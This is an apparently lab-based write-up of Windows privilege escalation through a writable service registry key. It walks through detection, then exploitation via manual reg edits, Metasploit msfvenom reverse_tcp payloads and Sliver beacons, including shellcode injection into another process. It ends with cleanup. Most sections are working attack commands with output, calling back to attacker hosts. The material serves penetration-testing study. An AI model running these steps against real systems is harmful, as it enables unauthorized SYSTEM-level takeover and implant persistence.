# Weak Registry Permissions

## 01 - Manual

Sometimes windows services that contains a registry value that was configured poorly using approved applications that can be escalated by attackers to re-configure the registry path of the binary.

### 1.1 - Detect

#### 1.1.1 - Command Prompt

```
C:\> wmic service get name,startname,pathname | findstr /i "localsystem" | findstr /i "c:\program files"
regsvc                                    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"           LocalSystem

C:\> sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Nothing out of the ordinary when trying to enumerate the binary that cannot be overwritten.

```
C:\> icacls "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
C:\Program Files\Insecure Registry Service\insecureregistryservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                       BUILTIN\Administrators:(I)(F)
                                                                       BUILTIN\Users:(I)(RX)
                                                                       APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                       APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

We use can the `reg.exe` command to query of a certain path of what we can override by the following registry values. The path for the registries that is related to Windows Services is `hklm\system\currentcontrolset\services` or `hkey_local_machine\system\currentcontrolset\services`

```
C:\> reg query hklm\system\currentcontrolset\services\regsvc

HKEY_LOCAL_MACHINE\system\currentcontrolset\services\regsvc
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
    DisplayName    REG_SZ    Insecure Registry Service
    ObjectName    REG_SZ    LocalSystem
```

When using `accesschk.exe` we can confirm that it is possible to override the registry configuration path file.

```
C:\> accesschk.exe -uvwqk hklm\system\currentcontrolset\services\regsvc
HKLM\system\currentcontrolset\services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS
```

#### 1.1.2 - Powershell

Nothing out of the ordinary when trying to enumerate the binary that cannot be overwritten.

```
PS C:\> get-acl "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe" | format-list


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Insecure Registry Service\insecureregistryservice.exe
Owner  : BUILTIN\Administrators
Group  : WIN-QBA94KB3IOF\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  :
Sddl   : O:BAG:S-1-5-21-3025105784-3259396213-1915610826-513D:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0  
         x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)

PS C:\> $acl = get-acl -path "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
PS C:\> convertfrom-sddlstring -sddl $acl.sddl | foreach-object {$_.DiscretionaryAcl}
NT AUTHORITY\SYSTEM: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)                       
BUILTIN\Administrators: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)                    
BUILTIN\Users: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
```

The other method to query using a powershell cmdlet **Get-ItemProperty** can be possible to enumerate.

```
PS C:\> get-itemproperty -path registry::hklm\system\currentcontrolset\services\regsvc


Type         : 16
Start        : 3
ErrorControl : 1
ImagePath    : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
DisplayName  : Insecure Registry Service
ObjectName   : LocalSystem
PSPath       : Microsoft.PowerShell.Core\Registry::hklm\system\currentcontrolset\services\regsvc
PSParentPath : Microsoft.PowerShell.Core\Registry::hklm\system\currentcontrolset\services
PSChildName  : regsvc
PSProvider   : Microsoft.PowerShell.Core\Registry


PS C:\> get-acl -path hklm:\system\currentcontrolset\services\regsvc | fl

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\system\currentcontrolset\services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)


PS C:\> $acl = get-acl -path hklm:\system\currentcontrolset\services\regsvc | fl
PS C:\> convertfrom-sddlstring -sddl $acl.sddl | foreach-object {$_.DiscretionaryAcl}
Everyone: AccessAllowed (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)
NT AUTHORITY\INTERACTIVE: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
```

### 1.2 - Exploit

`$ sudo nc -lnvp 53`

- In command prompt

```
C:\> copy shell.exe c:\temp\registry-query.exe

C:\> reg add hklm\system\currentcontrolset\services\regsvc /v imagepath /t reg_expand_sz /d c:\temp\registry-query.exe /f

C:\> net start regsvc
```

- In powershell

```
PS C:\> copy-item shell.exe c:\temp\registry-query.exe

PS C:\> set-itemproperty -path hklm:\system\currentcontrolset\services\regsvc -name imagepath -type expandstring -value c:\temp\registry-query.exe

PS C:\> start-service regsvc
```

```
$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.186.48.
Ncat: Connection from 10.10.186.48:49914.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### 1.3 - Cleanup

Now we have to revert back the modifications we've made by using the same command.

- In command prompt

`C:\Windows\system32> reg add hklm\system\currentcontrolset\services\regsvc /v imagepath /t reg_expand_sz /d "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe" /f`

- In powershell

`PS C:\> set-itemproperty -path hklm:\system\currentcontrolset\services\regsvc -name imagepath -type expandstring -value "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"`

## 02 - Metasploit

### 2.1 - Detect

```
meterpreter > getuid
Server username: TCM-PC\user
meterpreter > shell
Process 2276 created.
Channel 14 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>wmic service get name, startname, pathname | findstr /i "localsystem" | findstr /i "c:\program files"
wmic service get name, startname, pathname | findstr /i "localsystem" | findstr /i "c:\program files"
AmazonSSMAgent                       "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                         LocalSystem                  
AWSLiteAgent                         C:\Program Files\Amazon\XenTools\LiteAgent.exe                                             LocalSystem                  
daclsvc                              "C:\Program Files\DACL Service\daclservice.exe"                                            LocalSystem                  
dllsvc                               "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"                                 LocalSystem                  
Ec2Config                            "C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe"                                   LocalSystem                  
filepermsvc                          "C:\Program Files\File Permissions Service\filepermservice.exe"                            LocalSystem                  
regsvc                               "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"                   LocalSystem                  
unquotedsvc                          C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe                LocalSystem                  
VGAuthService                        "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                     LocalSystem                  
VMTools                              "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                        LocalSystem                  
VMware Physical Disk Helper Service  "C:\Program Files\VMware\VMware Tools\vmacthlp.exe"                                        LocalSystem                  
VMwareCAFCommAmqpListener            "C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe"             LocalSystem                  
VMwareCAFManagementAgentHost         "C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"          LocalSystem                  

C:\Users\user>exit
exit
meterpreter > load extapi
Loading extension extapi...Success.
meterpreter > service_query regsvc

Name        : regsvc
Display     : Insecure Registry Service
Account     : LocalSystem
Status      : Stopped
Start Type  : Manual
Path        : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
L.O. Group  : 
Interactive : No
DACL        : D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;WD)

meterpreter > execute -Hicf icacls -a "\"C:\Program Files\Insecure Registry Service\insecureregistryservice.exe\""
Process 1452 created.
Channel 17 created.
C:\Program Files\Insecure Registry Service\insecureregistryservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                       BUILTIN\Administrators:(I)(F)
                                                                       BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

### 2.2 - Exploit

```
meterpreter > bg
[*] Backgrounding session 1...
msf6 > handler -p windows/x64/meterpreter/reverse_tcp -H 10.8.145.108 -P 53 -x
[*] Payload handler running as background job 3.

[*] Started reverse TCP handler on 10.8.145.108:53
msf6 > sessions -i 1
[*] Starting interaction with 1...

$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.8.145.108 lport=53 -f exe-service -o shell-x64.exe

meterpreter > upload shell-x64.exe c:\\temp\\
[*] uploading  : /home/user/shell-x64.exe -> c:\temp\
[*] uploaded   : /home/user/shell-x64.exe -> c:\temp\\shell-x64.exe
meterpreter > reg enumkey -k HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc
Enumerating: HKLM\SYSTEM\CurrentControlSet\services\regsvc

  Keys (1):

        Security

  Values (6):

        Type
        Start
        ErrorControl
        ImagePath
        DisplayName
        ObjectName

meterpreter > reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc -v ImagePath -t REG_EXPAND_SZ -d "C:\temp\shell-x64.exe"
Successfully set ImagePath of REG_EXPAND_SZ.
meterpreter > reg queryval -k HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc -v ImagePath
Key: HKLM\SYSTEM\CurrentControlSet\services\regsvc
Name: ImagePath
Type: REG_EXPAND_SZ
Data: C:\temp\shell-x64.exe
meterpreter > service_control regsvc restart

[*] Sending stage (200774 bytes) to 10.10.1.151
[+] Operation restart succeeded.
[*] Meterpreter session 6 opened (10.8.145.108:53 -> 10.10.1.151:49262) at 2022-05-27 13:52:16 -0400

meterpreter > sessions 6
[*] Backgrounding session 1...
[*] Starting interaction with 6...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 2.3 - Cleanup

```
meterpreter > reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc -v ImagePath -t REG_EXPAND_SZ -d "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
meterpreter > reg queryval -k HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc -v ImagePath
Key: HKLM\SYSTEM\CurrentControlSet\services\regsvc
Name: ImagePath
Type: REG_EXPAND_SZ
Data: C:\Program Files\Insecure Registry Service\insecureregistryservice.exe
meterpreter > rm C:\\temp\\shell-x64.exe
```

## 03 - Sliver

### 3.1 - Detect

```
sliver (SPATIAL_CLEANER) > whoami

Logon ID: TCM-PC\user
[*] Tasked beacon SPATIAL_CLEANER (e5a695e8)

[+] SPATIAL_CLEANER completed task e5a695e8

sliver (SPATIAL_CLEANER) > sharpup audit ModifiableServiceRegistryKeys

[*] Tasked beacon SPATIAL_CLEANER (f04496f7)

[+] SPATIAL_CLEANER completed task f04496f7

[*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===

=== Services with Modifiable Registry Keys ===
        Service 'regsvc' (State: Stopped, StartMode: Manual) : SYSTEM\CurrentControlSet\Services\regsvc



[*] Completed Privesc Checks in 4 seconds

sliver (SPATIAL_CLEANER) > registry list-values -H HKLM "SYSTEM\\CurrentControlSet\\Services\\regsvc\\"

[*] Tasked beacon SPATIAL_CLEANER (5a7a8ee3)

[+] SPATIAL_CLEANER completed task 5a7a8ee3

[*] Values under HKLM:\SYSTEM\CurrentControlSet\Services\regsvc\:
Type
Start
ErrorControl
ImagePath
DisplayName
ObjectName

sliver (SPATIAL_CLEANER) > registry read -H HKLM "SYSTEM\\CurrentControlSet\\Services\\regsvc\\ImagePath"

[*] Tasked beacon SPATIAL_CLEANER (5a8760ce)

[+] SPATIAL_CLEANER completed task 5a8760ce

"C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
```

### 3.2 - Exploit

```
sliver (SPATIAL_CLEANER) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -a x64 -o windows -f service

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[*] Implant saved to /home/user/LEGISLATIVE_KICK-OFF.exe

sliver (SPATIAL_CLEANER) > upload LEGISLATIVE_KICK-OFF.exe c:/users/user/documents/registry-query.exe

[*] Tasked beacon SPATIAL_CLEANER (e4bcb2c1)

[+] SPATIAL_CLEANER completed task e4bcb2c1

[*] Wrote file to c:\users\user\documents\registry-query.exe

sliver (SPATIAL_CLEANER) > ls c:/users/user/documents/

[*] Tasked beacon SPATIAL_CLEANER (88077f15)

[+] SPATIAL_CLEANER completed task 88077f15

c:\users\user\documents (5 items, 9.3 MiB)
==========================================
-rw-rw-rw-  desktop.ini                            402 B    Thu Apr 16 23:22:42 -0500 2020
Lrw-rw-rw-  My Music -> C:\Users\user\Music        0 B      Thu Apr 16 23:22:28 -0500 2020
Lrw-rw-rw-  My Pictures -> C:\Users\user\Pictures  0 B      Thu Apr 16 23:22:28 -0500 2020
Lrw-rw-rw-  My Videos -> C:\Users\user\Videos      0 B      Thu Apr 16 23:22:28 -0500 2020
-rw-rw-rw-  registry-query.exe                     9.3 MiB  Thu Nov 17 12:45:54 -0500 2022

sliver (SPATIAL_CLEANER) > registry write -H HKLM -T string "SYSTEM\\CurrentControlSet\\Services\\regsvc\\ImagePath" "C:\\users\\user\\documents\\registry-query.exe"

[*] Tasked beacon SPATIAL_CLEANER (c81ed684)

[+] SPATIAL_CLEANER completed task c81ed684

[*] Value written to registry

sliver (SPATIAL_CLEANER) > registry read -H HKLM "SYSTEM\\CurrentControlSet\\Services\\regsvc\\ImagePath"

[*] Tasked beacon SPATIAL_CLEANER (ca3b870e)

[+] SPATIAL_CLEANER completed task ca3b870e

C:\users\user\documents\registry-query.exe

sliver (SPATIAL_CLEANER) > execute sc start regsvc

[*] Tasked beacon SPATIAL_CLEANER (76e88a73)

[*] Beacon 74c6ee5f LEGISLATIVE_KICK-OFF - 10.10.221.233:50428 (TCM-PC) - windows/amd64 - Thu, 17 Nov 2022 13:00:04 EST

sliver (SPATIAL_CLEANER) > kill

⚠  WARNING: This will kill the remote implant process

? Kill the active beacon? Yes
[*] Killed SPATIAL_CLEANER (4e816b78-e0e0-42f8-be16-d9d0a85e92b6)

sliver > use 74c6ee5f-8274-4829-bb19-21f244986b3c

[*] Active beacon LEGISLATIVE_KICK-OFF (74c6ee5f-8274-4829-bb19-21f244986b3c)

sliver (LEGISLATIVE_KICK-OFF) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Tasked beacon LEGISLATIVE_KICK-OFF (1fb04f7a)
```

### 3.3 - Cleanup

```
sliver (LEGISLATIVE_KICK-OFF) > registry write -H HKLM -T string "SYSTEM\\CurrentControlSet\\Services\\regsvc\\ImagePath" "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"

[*] Tasked beacon LEGISLATIVE_KICK-OFF (354a0229)

[+] LEGISLATIVE_KICK-OFF completed task 354a0229

[*] Value written to registry

sliver (LEGISLATIVE_KICK-OFF) > rm C:/users/user/documents/registry-query.exe

[*] Tasked beacon LEGISLATIVE_KICK-OFF (2543c90c)

[+] LEGISLATIVE_KICK-OFF completed task 2543c90c

[!] remove C:\users\user\documents\registry-query.exe: Access is denied.

sliver (LEGISLATIVE_KICK-OFF) > interactive

[*] Using beacon's active C2 endpoint: mtls://10.9.19.98:8888
[*] Tasked beacon LEGISLATIVE_KICK-OFF (5767e8bd)

[*] Session 56eb5c8a LEGISLATIVE_KICK-OFF - 10.10.221.233:49259 (TCM-PC) - windows/amd64 - Fri, 18 Nov 2022 08:20:22 EST

sliver (LEGISLATIVE_KICK-OFF) > sessions -i 5

[*] Active session LEGISLATIVE_KICK-OFF (56eb5c8a)

sliver (LEGISLATIVE_KICK-OFF) > ps

 Pid    Ppid   Owner                          Arch     Executable             Session
====== ====== ============================== ======== ====================== =========
 0      0                                              [System Process]       -1
 4      0                                     x86_64   System                 0
 404    4      NT AUTHORITY\SYSTEM            x86_64   smss.exe               0
 536    528    NT AUTHORITY\SYSTEM            x86_64   csrss.exe              0
 584    528    NT AUTHORITY\SYSTEM            x86_64   wininit.exe            0
 592    576    NT AUTHORITY\SYSTEM            x86_64   csrss.exe              1
 632    576    NT AUTHORITY\SYSTEM            x86_64   winlogon.exe           1
 680    584    NT AUTHORITY\SYSTEM            x86_64   services.exe           0
 688    584    NT AUTHORITY\SYSTEM            x86_64   lsass.exe              0
 700    584    NT AUTHORITY\SYSTEM            x86_64   lsm.exe                0
 788    680    NT AUTHORITY\SYSTEM            x86_64   svchost.exe            0
 864    680    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe            0
 936    632    NT AUTHORITY\SYSTEM            x86_64   LogonUI.exe            1
 952    680    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe            0
 996    680    NT AUTHORITY\SYSTEM            x86_64   svchost.exe            0
 100    680    NT AUTHORITY\SYSTEM            x86_64   svchost.exe            0
 532    680    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe            0
 1088   680    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe            0
 1208   680    NT AUTHORITY\SYSTEM            x86_64   spoolsv.exe            0
 1248   680    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe            0
 1368   680    NT AUTHORITY\SYSTEM            x86_64   amazon-ssm-agent.exe   0
 1468   680    NT AUTHORITY\SYSTEM            x86_64   LiteAgent.exe          0
 1496   680    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe            0
 1648   680    NT AUTHORITY\SYSTEM            x86_64   Ec2Config.exe          0
 1952   680    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe            0
 1976   680    NT AUTHORITY\SYSTEM            x86_64   svchost.exe            0
 1148   788    NT AUTHORITY\NETWORK SERVICE   x86_64   WmiPrvSE.exe           0
 2200   2192   NT AUTHORITY\SYSTEM            x86_64   csrss.exe              2
 2224   2192   NT AUTHORITY\SYSTEM            x86_64   winlogon.exe           2
 2380   680    TCM-PC\user                    x86_64   taskhost.exe           2
 2504   1088   TCM-PC\user                    x86_64   rdpclip.exe            2
 2544   996    TCM-PC\user                    x86_64   dwm.exe                2
 2580   2532   TCM-PC\user                    x86_64   explorer.exe           2
 2980   680    NT AUTHORITY\SYSTEM            x86_64   SearchIndexer.exe      0
 2364   680    NT AUTHORITY\SYSTEM            x86_64   TrustedInstaller.exe   0
 1784   2580   TCM-PC\user                    x86_64   SPATIAL_CLEANER.exe    2
 1788   680    NT AUTHORITY\SYSTEM            x86      mscorsvw.exe           0
 1848   680    NT AUTHORITY\SYSTEM            x86_64   mscorsvw.exe           0
 1424   680    NT AUTHORITY\NETWORK SERVICE   x86_64   sppsvc.exe             0
 3044   680    NT AUTHORITY\NETWORK SERVICE   x86_64   wmpnetwk.exe           0
 2520   680    NT AUTHORITY\SYSTEM            x86_64   registry-query.exe     0

sliver (LEGISLATIVE_KICK-OFF) > migrate 2364

[!] Error: rpc error: code = Unknown desc = exit status 1

sliver (LEGISLATIVE_KICK-OFF) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -G -a x64 -o windows -f shellcode

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[!] Shikata ga nai encoder is disabled
[*] Implant saved to /home/user/LUCKY_LAYER.bin

sliver (LEGISLATIVE_KICK-OFF) > execute-shellcode -A amd64 -p 1368 LUCKY_LAYER.bin

[*] Executed shellcode on target

[*] Beacon 31ac12a2 LUCKY_LAYER - 10.10.250.121:49366 (TCM-PC) - windows/amd64 - Fri, 18 Nov 2022 08:28:36 EST

sliver (LEGISLATIVE_KICK-OFF) > kill

⚠  WARNING: This will kill the remote implant process

? Kill the active session? Yes
[!] Lost session 56eb5c8a LEGISLATIVE_KICK-OFF - 10.10.221.233:49259 (TCM-PC) - windows/amd64 - Fri, 18 Nov 2022 08:32:10 EST

[!] Active session disconnected

[*] Killed LEGISLATIVE_KICK-OFF (56eb5c8a-818f-499d-9bb7-d17d1a34d1c5)
```

Terminate previous beacons

```
sliver > beacons rm

? Select a beacon: 74c6ee5f-8274-4829-bb19-21f244986b3c  LEGISLATIVE_KICK-OFF  10.10.221.233:49235  TCM-PC  NT AUTHORITY\SYSTEM  windows/amd64
[*] Beacon removed (74c6ee5f-8274-4829-bb19-21f244986b3c)

sliver > beacons rm

? Select a beacon: 4e816b78-e0e0-42f8-be16-d9d0a85e92b6  SPATIAL_CLEANER  10.10.221.233:49187  TCM-PC  TCM-PC\user          windows/amd64
[*] Beacon removed (4e816b78-e0e0-42f8-be16-d9d0a85e92b6)

sliver > use 31ac12a2-c4ff-4c86-b609-c0c9e415a92f

[*] Active beacon LUCKY_LAYER (31ac12a2-c4ff-4c86-b609-c0c9e415a92f)

sliver (LUCKY_LAYER) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Tasked beacon LUCKY_LAYER (bdab3a5e)

sliver (LUCKY_LAYER) > getpid

1368

sliver (LUCKY_LAYER) > rm "C:\users\user\documents\registry-query.exe"

[*] Tasked beacon LUCKY_LAYER (6c2af104)

[+] LUCKY_LAYER completed task 6c2af104

[*] C:\users\user\documents\registry-query.exe
```

## References

- [Windows Privilege Escalation Weak Registry Permission](https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/)

- [Abuse Service Registry ACLs Windows Privesc](https://medium.com/r3d-buck3t/abuse-service-registry-acls-windows-privesc-f88079140509)